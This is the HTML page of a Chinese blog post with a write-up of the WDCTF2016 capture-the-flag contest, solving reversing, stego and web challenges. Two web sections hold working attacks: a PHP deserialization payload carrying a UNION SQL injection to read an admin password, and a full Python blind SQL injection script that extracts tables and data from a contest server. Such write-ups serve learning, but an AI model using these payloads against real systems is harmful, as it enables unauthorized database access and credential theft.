@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexo</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="转眼又是一年，想来又老了一岁，看到昨天空间刷的18岁，也确实值得缅怀一下？
+那一年我高三。18岁嘛，少年当头，青春正好，然后我在高三。也就是那一年，跨过了人生中第二道门槛(?),高考。
+听高中老师忽,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="/css/diaspora.css">
+
+</head>
+
+<body class="loading">
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">WDCTF2016-Writeup</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+    <div class="section">
+        <div class="article">
+    <div>
+        <h1 class="title">WDCTF2016-Writeup</h1>
+        <div class="stuff">
+            <span>十二月 07, 2016</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/2016/">2016</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Blogs/">Blogs</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>辣鸡问X杯，毁我青春。积分排名第四没进决赛，hhhh。。。。</p>
+<a id="more"></a>
+<h1 id="2016问鼎杯Write-up"><a href="#2016问鼎杯Write-up" class="headerlink" title="2016问鼎杯Write-up"></a>2016问鼎杯Write-up</h1><h2 id="0x01-微微一笑"><a href="#0x01-微微一笑" class="headerlink" title="0x01 微微一笑"></a>0x01 微微一笑</h2><p>一张图片二维码，本来以为是图片隐写，把lsb，binwalk等都跑了一遍结果没发现东西。然后关注了一下公众号，发送“flag”，居然自动弹出了flag。。。</p>
+<h2 id="0x02-洋为中用"><a href="#0x02-洋为中用" class="headerlink" title="0x02 洋为中用"></a>0x02 洋为中用</h2><p>一道Re题目，吐槽一下为什么这次Re题目为什么都是C++的。。。</p>
+<p>用ida分析了一下，发现是类似base64加密的加密器，只不过加密的结果都是中文。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(v21 &amp; 0x3FFFu) + 20019);</span><br><span class="line">和</span><br><span class="line">v15 = v13 &amp; 0x3FFF;</span><br></pre></td></tr></table></figure>
+<p>这样两句能看出有一次UTF-8的转码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|| (BYTE1(v4) = *(v25 + 1), v5 == 2)</span><br><span class="line">         || (v4 = (*(v25 + 2) &lt;&lt; 16) | v4 &amp; 0xFFFFFFFFFF00FFFFLL, v5 == 3)</span><br><span class="line">         || (v4 = (*(v25 + 3) &lt;&lt; 24) | v4 &amp; 0xFFFFFFFF00FFFFFFLL, v5 == 4)</span><br><span class="line">         || (v4 = (*(v25 + 4) &lt;&lt; 32) | v4 &amp; 0xFFFFFF00FFFFFFFFLL, v5 == 5)</span><br><span class="line">         || (v4 = (*(v25 + 5) &lt;&lt; 40) | v4 &amp; 0xFFFF00FFFFFFFFFFLL, v5 == 6)</span><br><span class="line">         || (v4 = (*(v25 + 6) &lt;&lt; 48) | v4 &amp; 0xFF00FFFFFFFFFFFFLL, v5 == 7)</span><br></pre></td></tr></table></figure>
+<p>这段代码能看出进行了一次UTF-16的转码，高位补零。</p>
+<p>解密的过程：将密文进行UTF-8解码，然后减去0x4E33，然后补零使长度统一为14位。然后将所有二进制串反序连接在一起，将二进制流分为八个一组转换成对应字符，同时反序。(从第四组数据开始解密)</p>
+<p>解密脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-       &lt;--------------采用utf-8</span><br><span class="line">f = open(&quot;secret.txt&quot;,&quot;r&quot;)</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.decode(&apos;utf-8&apos;)</span><br><span class="line">length = len(data)</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">def fg(string,width):</span><br><span class="line">	return [string[x:x+width] for x in range(0,len(string),width)]</span><br><span class="line">def step1(string):</span><br><span class="line">	string = bin(string)</span><br><span class="line">	string = string[2:]</span><br><span class="line">	length = len(string)</span><br><span class="line">	c = 14-length</span><br><span class="line">	for i in range(0,c):</span><br><span class="line">		string = &quot;0&quot;+string</span><br><span class="line">	return string</span><br><span class="line"></span><br><span class="line">for i in range(0,length):</span><br><span class="line">	p = data[i]</span><br><span class="line">	tmp = ord(p)-0x4e33</span><br><span class="line">	tmp = step1(tmp)</span><br><span class="line">	res = tmp+res</span><br><span class="line">res = res[4:]</span><br><span class="line">data = fg(res,8)</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">for a in data:</span><br><span class="line">	a = int(a,2)</span><br><span class="line">	res = chr(a)+res</span><br><span class="line">print res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#flag:BaseCJKisSimilar2Base64</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-窃听风云"><a href="#0x03-窃听风云" class="headerlink" title="0x03 窃听风云"></a>0x03 窃听风云</h2><p>下载文件secret.data。用文本编辑器打开发现里面是Base64的加密。用16进制编辑器发现解密之后是个音频文件。音频是一段摩斯电码。用Audacity分析该音频文件的音高。<br><img src="http://i.imgur.com/ihlVFZD.png" alt=""></p>
+<p>高音代表长音，低音代表断音，复现的电码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.........-.-..-..-.---....-..-...---......-----.-.....-.-.----....----.....-...--.</span><br></pre></td></tr></table></figure></p>
+<p>解密得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">THESECRETWDFLAGISMORESCODE1SFUN</span><br><span class="line">Flag：MORESCODE1SFUN</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-百转千回"><a href="#0x04-百转千回" class="headerlink" title="0x04 百转千回"></a>0x04 百转千回</h2><p>一道Re题目。根据serial求得对应name。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hint:</span><br><span class="line">name一共12位，</span><br><span class="line">name[0]=&apos;&#123;&apos;,name[1]=&apos;h&apos;,name[2]=&apos;d&apos;,name[3]=&apos;u&apos;</span><br><span class="line">name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apos;&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p>name一共有12位，Hint中给了8位，所以只需要推算出剩下的四位。<br>{hduXbXXX0_}</p>
+<p>用ida分析，找到出现Great的部分，发现加密函数sub_401F30。(该函数被调用了11次，对应serial的11组序号)</p>
+<p>sub_401F30函数的参数可以看出是每两位进行一次加密。</p>
+<p>加密顺序为：name[0]name[1]第一次加密，name[1]name[2]第二次加密，以此类推，有11次加密。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v15 = ((a3 &gt;&gt; 2) &amp; 1) + (a1 &amp; 1) + 6;</span><br><span class="line">  *(a2 + 20) = 15;</span><br><span class="line">  *(a2 + 16) = 0;</span><br><span class="line">  *a2 = 0;</span><br><span class="line">  v14 = ((a1 &gt;&gt; 3) &amp; 1) + 6 + ((a3 &gt;&gt; 3) &amp; 1);</span><br><span class="line">  v17 = ((a1 &gt;&gt; 1) &amp; 1) + 6 + ((a3 &gt;&gt; 4) &amp; 1);</span><br><span class="line">  v4 = (a3 &amp; 1) + 6 + ((a1 &gt;&gt; 2) &amp; 1);</span><br><span class="line">  v16 = (a3 &amp; 1) + 6 + ((a1 &gt;&gt; 2) &amp; 1);</span><br><span class="line">  v5 = ((a1 &gt;&gt; 4) &amp; 1) + ((a3 &gt;&gt; 1) &amp; 1) + 54；</span><br></pre></td></tr></table></figure></p>
+<p>将name的成员转换成二进制，假设每一份二进制为Hex。</p>
+<p>判断name[0].Hex[0]+name[1].Hex[2]+6的值是否等于7</p>
+<p>判断name[0].Hex[3]+name[1].Hex[3]+6的值是否等于8</p>
+<p>判断name[0].Hex[1]+name[1].Hex[4]+6的值是否等于7</p>
+<p>判断name[0].Hex[2]+name[1].Hex[0]+6的值是否等于6</p>
+<p>判断name[0].Hex[4]+name[1].Hex[1]+6的值是否等于7</p>
+<p>以此类推。</p>
+<p>根据序列号可求出剩余四位的二进制的后五位，根据可显字符</p>
+<p>可以判断二进制的高三位为’010’，进而可以确定剩余四位符号的二进制。</p>
+<p>Flag = {hdu_brav0_}</p>
+<h2 id="0x05-一波三折"><a href="#0x05-一波三折" class="headerlink" title="0x05 一波三折"></a>0x05 一波三折</h2><p>题目给的文件里面是像素点，只有计算了一下像素点的个数，是307x311,写成图片形式。是个二维码，扫描后拿到一个url地址，打开拿到flag.<br>贴上脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import Image</span><br><span class="line">import re</span><br><span class="line">x = 307</span><br><span class="line">y = 311</span><br><span class="line">fp = open(&apos;1.txt&apos;)</span><br><span class="line">data = fp.read()</span><br><span class="line">data = re.findall(&apos;[0-9]*,[0-9]*,[0-9]*,&apos;,data)</span><br><span class="line">res = Image.new(&quot;RGB&quot;,(x,y))</span><br><span class="line">pos = 0</span><br><span class="line">for i in range(0,x):</span><br><span class="line">	for j in range(0,y):</span><br><span class="line">		px = re.findall(r&apos;([0-9]+)&apos;,data[pos])</span><br><span class="line">		res.putpixel(([i,j]),(int(px[0]),int(px[1]),int(px[2])))</span><br><span class="line">		pos = pos + 1</span><br><span class="line">res.save(&quot;flag.png&quot;)</span><br><span class="line">res.show()</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-期期艾艾"><a href="#0x06-期期艾艾" class="headerlink" title="0x06 期期艾艾"></a>0x06 期期艾艾</h2><blockquote>
+<p>小明有口吃，他知道世界上最长的单词。<br>在数学界四大金刚(小明，小红，小芳，小刚)的聚会中，为了活跃气氛，小明让大家玩个猜数字的游戏。<br>小明给出了一串奇奇怪怪的东西，如下：<br>0 b29vb3Njb3BpY3Np<br>1 YW1pY3Jvc29wY2lj<br>2 bm5vdWx0cmFtaWNy<br>3 c2lsaWNvdm9sYW5j<br>4 bGljY2Nvdm9sY2Fu<br>5 cHBubm5uZXVtb25u<br>6 bW9ub2x1dHJhbWlj<br>7 b2Nvbmlvc2lpaWlz<br>8 aWNzaWxpb29jdmxj<br>9 Y2FvbmNvmblvc2lz</p>
+</blockquote>
+<p>这是题目描述，全部为base64密文。解密后去掉重复(口吃)是:</p>
+<blockquote>
+<p>oscopicsi<br>amicrosopcic<br>noultramicr<br>silicovolanc<br>licovolcan<br>pneumon<br>monolutramic<br>oconiosis<br>icsiliocvlc<br>caoncosis</p>
+</blockquote>
+<p>题目说了一句，他知道世上最长的单词。但是我在网上找到了更长的单词Orz,符合题目的是pneumonoultramicroscopicsilicovolcanoconiosis<br>from <a href="http://www.baike.com/wiki/%E6%9C%80%E9%95%BF%E7%9A%84%E8%8B%B1%E6%96%87%E5%8D%95%E8%AF%8D" target="_blank" rel="noopener">http://www.baike.com/wiki/%E6%9C%80%E9%95%BF%E7%9A%84%E8%8B%B1%E6%96%87%E5%8D%95%E8%AF%8D</a><br>把这单词对应部分的顺序对应的数字连在一起就是flag.</p>
+<h2 id="0x07-走笔疾书"><a href="#0x07-走笔疾书" class="headerlink" title="0x07 走笔疾书"></a>0x07 走笔疾书</h2><p>这题查看源代码能看到一个提示，xxx tell you a url:xxxxpostData?token=&amp;key<br>。这题坑了很多人，导致最后第二题差点来不及。cookie中有一个key,md5解开后发现是几个字符，刚开始以为这个就是key,直到晚上放了hint后才知道。css里有个t0ken的RGB值，每次刷新都会改变，把这个值转为16进制，key也是脑洞，提示里提到了js,在控制台试了一下，就拿到了key。刚开始被误导了，自以为是的以为是post过去，发现老是不行，最后试了一下用get的方式传过去，成功拿到flag.</p>
+<h2 id="0x08-井然有序"><a href="#0x08-井然有序" class="headerlink" title="0x08 井然有序"></a>0x08 井然有序</h2><p>这种题做过好几次了，反序列化的题，绕过wake函数，从而绕过过滤。写php脚本如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class COMEON&#123;</span><br><span class="line">private $method=&quot;show&quot;;</span><br><span class="line">private $args=array(</span><br><span class="line">	&quot;admin&apos; union/*!00000select*/password,1,1 from users where username = &apos;admin&apos; limit 1,1#&quot;</span><br><span class="line">	);</span><br><span class="line">private $conn=false; </span><br><span class="line">   &#125;</span><br><span class="line">   $a = new COMEON();</span><br><span class="line">   echo urlencode(serialize($a));</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p>结果为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22COMEON%22%3A3%3A%7Bs%3A14%3A%22%00COMEON%00method%22%</span><br><span class="line">3Bs%3A4%3A%22show%22%3Bs%3A12%3A%22%00COMEON%00args%22%3Ba%3A1%3</span><br><span class="line">A%7Bi%3A0%3Bs%3A87%3A%22admin%27+union%2F%2A%2100000select%2A%2F</span><br><span class="line">password%2C1%2C1+from+users+where+username+%3D+%27admin%27+limit</span><br><span class="line">+1%2C1%23%22%3B%7Ds%3A12%3A%22%00COMEON%00conn%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>
+<p>修改对象成员个数为4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22COMEON%22%3A4%3A%7Bs%3A14%3A%22%00COMEON%00method%22%</span><br><span class="line">3Bs%3A4%3A%22show%22%3Bs%3A12%3A%22%00COMEON%00args%22%3Ba%3A1%3</span><br><span class="line">A%7Bi%3A0%3Bs%3A87%3A%22admin%27+union%2F%2A%2100000select%2A%2F</span><br><span class="line">password%2C1%2C1+from+users+where+username+%3D+%27admin%27+limit</span><br><span class="line">+1%2C1%23%22%3B%7Ds%3A12%3A%22%00COMEON%00conn%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>
+<p>拿到flag.</p>
+<h2 id="0x09-顺藤摸瓜"><a href="#0x09-顺藤摸瓜" class="headerlink" title="0x09 顺藤摸瓜"></a>0x09 顺藤摸瓜</h2><p>(400分)这仅仅是一个数字游戏，Are you ready?<br>题目解压完是一个安卓apk文件，用安卓逆向神器JEB直接反编译出源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">super.onCreate(savedInstanceState);</span><br><span class="line">this.setContentView(2130968601);</span><br><span class="line">ButterKnife.bind(((Activity)this));</span><br><span class="line">this.mmText.setText(&quot;WDFLAG=&quot; + String.valueOf(String.valueOf(this.getContent(this.theFlag()))</span><br><span class="line">.hashCode()));</span><br><span class="line">this.mmText.setTransformationMethod(PasswordTransformationMethod.getInstance());</span><br><span class="line">&#125;</span><br><span class="line">这是主函数。</span><br><span class="line"></span><br><span class="line">private String theFlag() &#123;</span><br><span class="line">String v2;</span><br><span class="line">try &#123;</span><br><span class="line">v2 = this.getPackageManager().getPackageInfo(this.getPackageName(), 0).packageName;</span><br><span class="line">&#125;</span><br><span class="line">catch(PackageManager$NameNotFoundException v0) &#123;</span><br><span class="line">v0.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return v2;</span><br><span class="line">&#125;</span><br><span class="line">private int getContent(String packageName) &#123;</span><br><span class="line">int v1 = 233;</span><br><span class="line">PackageManager v2 = this.getPackageManager();</span><br><span class="line">try &#123;</span><br><span class="line">v1 += v2.getPackageInfo(packageName, 0).versionCode;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception v0) &#123;</span><br><span class="line">v0.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return v1;</span><br><span class="line">&#125;</span><br><span class="line">public final class BuildConfig &#123;</span><br><span class="line">public static final String APPLICATION_ID = &quot;test.seclab.com.ctftest&quot;;</span><br><span class="line">public static final String BUILD_TYPE = &quot;release&quot;;</span><br><span class="line">public static final boolean DEBUG = false;</span><br><span class="line">public static final String FLAVOR = &quot;&quot;;</span><br><span class="line">public static final int VERSION_CODE = 1227;</span><br><span class="line">public static final String VERSION_NAME = &quot;1.0&quot;;</span><br><span class="line"></span><br><span class="line">public BuildConfig() &#123;</span><br><span class="line">super();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析源代码可知，首先获取了包的版本号，是1227，加上233，是1460。再用一波hashCode方法，结果就是FLAG。</p>
+<h2 id="0x0A盲人摸象"><a href="#0x0A盲人摸象" class="headerlink" title="0x0A盲人摸象"></a>0x0A盲人摸象</h2><p>试了一下就知道是sql注入，但是多了一个hash校验的验证，也很简单，用for循环遍历一下1-1000000之前的哈系值，根据开头四位判断，用python写个脚本，可以直接绕过。联合注入在information_schema.tables里拿到表名ffff1ag，然后进行盲注，拿到flag.这题没什么脑洞，主要还是写代码吧。</p>
+<pre><code># coding=utf-8
+import requests
+import random
+import hashlib
+s = requests.Session()
+url=&apos;http://sec2.hdu.edu.cn/e33cdf8c2126fc5490fbc5d7fc269036/index.php&apos;
+tables_count_num = 0
+#get code
+def step1(url):
+    r=s.get(url)
+    code = r.text.find(&apos;==&apos;)
+    return r.text[code+3:code+7]
+#crack code
+def step2(code):
+    num = 10000
+
+    while 1:
+        m = hashlib.md5()   
+        m.update(str(num))
+        if (m.hexdigest()[0:4]==code):
+            return num
+            break
+        num += 1
+
+
+def get_data(payload):
+    code =step2(step1(url))
+    data={
+    &quot;id&quot;:payload,
+    &quot;code&quot;:code
+    }
+    r = s.post(url,data = data)
+    pos1 = r.text.find(&apos;&lt;td&gt;&apos;)
+    pos2 = r.text[pos1+4:].find(&apos;&lt;/td&gt;&apos;)
+    return r.text[pos1+4:][:pos2]
+
+def get_tables(url):
+
+    payload = &quot;-1 UNION SELECT COUNT(*),&apos;user&apos; from information_schema.tables WHERE table_schema = DATABASE() limit 0,1&quot;
+    tables_count_num = get_data(payload)
+    print &quot;tables_number: &quot;+tables_count_num
+    for i in range(0,int(tables_count_num)):
+        payload = &quot;-1 UNION SELECT length(table_name),&apos;user&apos; from information_schema.tables WHERE table_schema = DATABASE() limit &quot;+str(i)+&quot;,1&quot;
+        tables_name_len = get_data(payload)
+        print &quot;tables_name_len: &quot;+tables_name_len
+        tables_name = &quot;&quot;
+        for j in range(0,int(tables_name_len)):
+            payload = &quot;-1 UNION SELECT ascii(substring(table_name,&quot;+str(j+1)+&quot;,1)),&apos;user&apos; from information_schema.tables WHERE table_schema = DATABASE() limit &quot;+str(i)+&quot;,1&quot;
+            str = get_data(payload)
+            tables_name += chr(int(str))
+        print &quot;tables_name:&quot;+ tables_name
+
+def get_columns():
+    payload = &quot;-1 UNION SELECT COUNT(*),&apos;user&apos; from information_schema.columns WHERE table_name = &apos;ffff1ag&apos; limit 0,1&quot;
+    columns_count_num = get_data(payload)
+    print &quot;columns_number: &quot;+columns_count_num
+    for i in range(0,int(columns_count_num)):
+        payload = &quot;-1 UNION SELECT length(column_name),&apos;user&apos; from information_schema.columns WHERE table_name = &apos;ffff1ag&apos; limit &quot;+str(i)+&quot;,1&quot;
+        columns_name_len = get_data(payload)
+        print &quot;columns_name_len: &quot;+columns_name_len
+        columns_name = &quot;&quot;
+        for j in range(0,int(columns_name_len)):
+            payload = &quot;-1 UNION SELECT ascii(substring(column_name,&quot;+str(j+1)+&quot;,1)),&apos;user&apos; from information_schema.columns WHERE table_name = &apos;ffff1ag&apos; limit &quot;+str(i)+&quot;,1&quot;
+            str = get_data(payload)
+            columns_name += chr(int(str))
+        print &quot;columns_name:&quot;+ columns_name
+
+def get_flag():
+    payload = &quot;-1 UNION SELECT COUNT(fflag),&apos;user&apos; from ffff1ag limit 0,1&quot;
+    flag_count_num = get_data(payload)
+    print &quot;flag: &quot;+flag_count_num
+    for i in range(0,int(flag_count_num)):
+        payload = &quot;-1 UNION SELECT length(fflag),&apos;user&apos; from ffff1ag limit &quot;+str(i)+&quot;,1&quot;
+        flag_len = get_data(payload)
+        print &quot;flag_len: &quot;+flag_len
+        flag = &quot;&quot;
+        for j in range(0,int(flag_len)):
+            payload = &quot;-1 UNION SELECT ascii(substring(fflag,&quot;+str(j+1)+&quot;,1)),&apos;user&apos; from ffff1ag limit &quot;+str(i)+&quot;,1&quot;
+            str = get_data(payload)
+            flag += chr(int(str))
+            print &quot;flag:&quot;+flag
+        print &quot;flag:&quot;+ flag
+
+def mrmx():
+    get_tables(url)
+    get_columns()
+    get_flag()
+
+if __name__ == &apos;__main__&apos;:
+mrmx()
+
+
+</code></pre>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="http://link.hhtjim.com/163/425570952.mp3">
+            </audio>
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+</body>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-69833742-2', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
